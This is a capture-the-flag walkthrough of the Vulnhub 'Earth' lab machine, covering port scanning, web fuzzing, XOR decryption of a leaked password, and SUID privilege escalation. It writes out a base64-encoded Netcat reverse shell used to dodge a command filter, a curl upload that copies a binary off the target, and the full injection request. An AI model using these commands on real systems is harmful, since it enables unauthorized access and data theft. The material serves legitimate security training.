---
title: CTF Walkthrough for Vulnhub Machine Earth 
category: [Walkthrough, CTF]
tags: [vulnhub, writeup, earth, machines, pentest]   
image:
  path: /assets/img/posts/walthrough/vulnhub/2024-09-11-earth/box-earth.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Earth an easy machine in the Planets series of Vulnhub machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Earth<br>
Goal: Get two flags<br>
Difficulty: Easy<br>
Operating System: Linux<br>
Download link: [Earth](https://download.vulnhub.com/theplanets/Earth.ova)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) CyberChef

## Reconnaissance
Since we are in a new network, we first need to identify our target on the network. This can be done using Nmap host discovery scans. 
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Service]
└─$nmap -sn -n 10.0.2.15/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 17:45 BST
<SNIP>
Nmap scan report for 10.0.2.4
Host is up (0.00087s latency).
Nmap scan report for 10.0.2.15
Host is up (0.00017s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.94 seconds
```
Once we know the IP address of our target we can continue by performing a service scan. This is to uncover the services running on opened ports on  our target.
we can  continue with a targeted service scan on open ports.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Service]
└─$sudo nmap -n -Pn --disable-arp-ping -sV -sC -oN services-scan.nmap 10.0.2.4
Nmap scan report for 10.0.2.4
Host is up (0.00039s latency).
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Bad Request (400)
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
<SNIP>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 10 17:51:39 2024 -- 1 IP address (1 host up) scanned in 14.79 seconds
```
We can see from the above result that our target runs an SSH and a Web server. This web server appears to use HTTPS on port 443 in addition to HTTP. In addition, the scan also reveals two domains used by our target. We can add these domains to our /etc/hosts file. 
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Service]
└─$ echo "10.0.2.4\tearth.local  terratest.earth.local" | sudo tee -a /etc/hosts
10.0.2.4        earth.local  terratest.earth.local
```
After adding these domains, we can visit both domains using both HTTP and HTTPS protocols.
![](/assets/img/posts/walthrough/vulnhub/2024-09-11-earth/1-browse.png){: .center}

![](/assets/img/posts/walthrough/vulnhub/2024-09-11-earth/2-browse.png){: .center}

After visiting them, we will notice that the HTTPS version of terratest.earth.local is different from the rest and appears to be a test site. Test sites are usually weak points since they have not been tested vigorously by the site creator. Let's fuzz this site to uncover any hidden file or directory.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Web]
└─$ ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/common.txt  -u https://terratest.earth.local/FUZZ 

<SNIP>

.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 2ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 1ms]
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 295ms]
index.html              [Status: 200, Size: 26, Words: 4, Lines: 2, Duration: 0ms]
robots.txt              [Status: 200, Size: 521, Words: 31, Lines: 31, Duration: 172ms]
:: Progress: [4734/4734] :: Job [1/1] :: 220 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```
The website appears to have a robots.txt file, this file tells search engine crawlers which URLs the crawler can access on a site.  It usually contains directories and files which should not be accessed by web crawlers. Let's access this file.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Web]
└─$ curl  --insecure https://terratest.earth.local/robots.txt
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
<SNIP>
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```
We see an interesting file that probably could not be discovered by our fuzzer. Let's visit this directory. The robots.txt file does not specify the extension of the file but since we know notes are usually kept as text files let's try the .txt extension.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Web]
└─$ curl  --insecure https://terratest.earth.local/testingnotes.txt
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
According to the testing notes recorded by the website administrator, The messages we saw when we visited the other domains are encrypted using Xor encryption, the testdata.txt file was used to test the encryption and the is apparently and admin portal that has terra as username. From our last fuzzing, we did not see any admin portal let's fuzz the other domains to discover this portal.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Service]
└─$ ffuf -c -ic  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt  -u http://terratest.earth.local/FUZZ  -e .php                                                             
                                               
<SNIP>
    
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 225ms]            
                        [Status: 200, Size: 3232, Words: 65, Lines: 108, Duration: 281ms]
:: Progress: [175302/175302] :: Job [1/1] :: 512 req/sec :: Duration: [0:15:53] :: Errors: 0 :: 
```
From the result above we have uncovered an admin directory, upon visiting this directory, we are redirected to the login.php page
![](/assets/img/posts/walthrough/vulnhub/2024-09-11-earth/login-page.png){: .center}

At this point, we know the admin username but we still have no idea of the password. Another important point in the testingnotes.txt file is that the file testdata.txt was used to test the encryption. This can be understood in several ways i.e. either the content of the file has been encrypted to test the encryption process or the content has been used as the encryption key in the encryption process. Let's first access this file and see its content.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scan/Web]
└─$ curl  --insecure https://terratest.earth.local/testdata.txt
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```
This appears to be a long text. Among the assumptions made above, the one assuming that this file is the decryption key is easier to test so, let's use [CyberChef](https://gchq.github.io/CyberChef/) to test it out. Remember that this text is in hexadecimal so we first need to convert it from hexadecimal before testing the content of testdata.txt as the decryption key for the Xor encryption.
![](/assets/img/posts/walthrough/vulnhub/2024-09-11-earth/xor-decryption.png){: .center}

From the image above we can see that the last message on the home page was transformed into something reasonable hence the assumption that the content of testdata.txt was the encryption key becomes a fact. This text appears to be the repetition of the string **earthclimatechagebad4humans**. This was our last hint from the testingnotes.txt file. Penetration testing involves conducting multiple trials to assess security. Let's test whether this string is used as the password for the admin portal.
![](/assets/img/posts/walthrough/vulnhub/2024-09-11-earth/admin-login.png){: .center}

## Exploitation
As shown above the string **earthclimatechagebad4humans** was indeed the terra's password. This presents us with an interface that appears to run system commands. Let's try the **whoami** command.
![](/assets/img/posts/walthrough/vulnhub/2024-09-11-earth/whoami-command.png){: .center}

This has successfully executed the **whoami** command. Unfortunately for us, when we insert a reverse shell command it returns an error saying that remote connections are forbidden. This system appears to filter out commands. We can bypass this filter by base64 encoding our command.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scan/Web]
└─$ echo 'nc 10.0.2.15 8000 -e /bin/bash' | base64
 bmMgMTAuMC4yLjE1IDgwMDAgLWUgL2Jpbi9iYXNo
```
Next, we can start a listener on our attack host using Netcat
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
```
Finally, we can send the payload to the target. This payload will decode the reverse shell command during execution and pipe it to the bash shell  which will execute this command.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans/Web]
└─$ curl -s  http://earth.local/admin/ -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: csrftoken=ULMgg6OATd9eLgwnx8Sbmj4a9RoqNmwfe4x6y1d3CZM02ikioy8ZanjOAQ5Ze5xY; sessionid=tjnd6cq8eccdg4hztnc6u5xin8pen4oa' -d 'csrfmiddlewaretoken=tyogIfNjcOEP1Bdmw9A5wRvEQLyjN5q8NR960acMVAhBiD1hnzQTkVKihKfSeOrR&cli_command=echo+bmMgMTAuMC4yLjE1IDgwMDAgLWUgL2Jpbi9iYXNo|base64+-d|bash'
  
```
If we go back to our listener we can see that the target connected to us and we can test this with the **whoami** command.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Scans]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.4] 42196
whoami
apache
```
With this reverse shell, we can enumerate the target. Upon enumeration we will uncover the user flag in a directory under the **/var** parent directory.
```bash
pwd                                                             
/var
                                                                                                                                                                                                                                             
ls -lRa
                                                                                                                                                                           
<SNIP>
                         
./earth_web:                                                                                            
total 164                                                                                               
drwxrwxrwx.  4 root root    101 Sep 10 20:47 .                                                           
drwxr-xr-x. 22 root root   4096 Oct 12  2021 ..                                                        
-rwxrwxrwx.  1 root root 155648 Sep 10 20:47 db.sqlite3                                                
drwxr-xr-x.  3 root root    108 Oct 13  2021 earth_web                                                    
-rwxr-xr-x.  1 root root    665 Oct 11  2021 manage.py                                    
drwxr-xr-x.  6 root root    204 Oct 13  2021 secure_message                                            
-rw-r--r--.  1 root root     45 Oct 12  2021 user_flag.txt
                                                                                                                                                    
<SNIP>
```

## Post Exploitation

Once the user flag is obtained we can start enumerating the system  for any means to escalate our privileges. Two common ways we may escalate our privileges is by leveraging sudo rights or binaries with SUID bit set. Unfortunately our user doesn't belong to the sudo group but upon enumerating for executables with SUID bit set we can see an uncommon executable named reset_root.
```bash
find / -perm -4000 -exec ls -ldb {} \;
-rwsr-xr-x. 1 root root 74208 Aug  9  2021 /usr/bin/chage
<SNIP>
-rwsr-xr-x. 1 root root 24552 Oct 12  2021 /usr/bin/reset_root
-rwsr-xr-x. 1 root root 15632 Sep 29  2021 /usr/sbin/grub2-set-bootflag
<SNIP>
```
This looks like a custom executable made by the system's users. We can transfer this executable to our system to analyse its behaviour. This transfer can be done using the Python3 uploadserver module. To do this we first start a Python3 uploadserver module to listen on a port.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Misc Files]
└─$ python3 -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Next, we use the curl command on our target to upload the file in the /upload directory of our server.
```bash
curl -X POST http://10.0.2.15:8000/upload -F 'files=@/usr/bin/reset_root'
```
We can see on our attack host that this file has been uploaded.
```bash
┌──(pentester㉿kali)-[/VulnHub/Earth/Misc Files]
└─$ python3 -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.0.2.4 - - [10/Sep/2024 23:57:00] [Uploaded] "reset_root" --> /VulnHub/Earth/Misc Files/reset_root 
10.0.2.4 - - [10/Sep/2024 23:57:00] "POST /upload HTTP/1.1" 204 -
```
Since this appears to be an uncommon binary we can start our analyses by understanding which built-in OS command is been run by the binary. We can do this using **binwalk** which is a tool for searching a given binary image for embedded files and executable code.
```                                                                                                                                                            
┌──(pentester㉿kali)-[/VulnHub/Earth/Misc Files]
└─$ binwalk reset_root 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)
8312          0x2078          Unix path: /usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd
21385         0x5389          Unix path: /usr/lib/gcc/x86_64-redhat-linux/11/../../../../lib64/crt1.o
```
We can see that the reset_root executable changes the root password to Earth. Also, we can note that uses external libraries. Since binwalk does not give us any information on how these libraries are used, we can use **ltrace**. ltrace intercepts and records dynamic library calls which are called by an executed process and the signals received by that process.
```
┌──(pentester㉿kali)-[/VulnHub/Earth/Misc Files]
└─$ ltrace ./reset_root 
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                      = 38
access("/dev/shm/kHgTFI5G", 0)                                                                   = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                   = -1
access("/tmp/kcM0Wewe", 0)                                                                       = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                      = 44
+++ exited (status 0) +++
```
We see that the ```access()``` function from the C standard library is used by the executable. This function is used to check the accessibility of a file. The access function takes a file/folder name and a mode, The 0 in here means it is checking for the existence of the file. From the message written by the ```puts()``` we can understand that if the checking process fails the reset will also fail. Our objective is to reset the root password to Earth in order to take over the machine. We can do this by creating fake files on our target having these names.
```bash
mkdir /dev/shm
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
ls /dev/shm
Zw7bV9U5
kHgTFI5G
touch /tmp/kcM0Wewe
```
Once the files are created we can run the executable which will reset the root password to Earth and now use this password to log in as the root user.
```
/usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
su root
Earth
whoami
root
ls /root
anaconda-ks.cfg
root_flag.txt
```
Great, with this access we can see the root flag in the root's home directory.

## Conclusion

Congratulations! In this walkthrough, you thoroughly enumerated the website and discovered notes left by the administrator. Leveraging these notes, you gained initial access to the system. Subsequently, you conducted reverse engineering to analyse the custom binary created by the system administrator, which allowed you to understand its functionality. With this understanding, you exploited the binary to escalate your privileges and achieve root access to the system. Thank you for following up on this walkthrough.
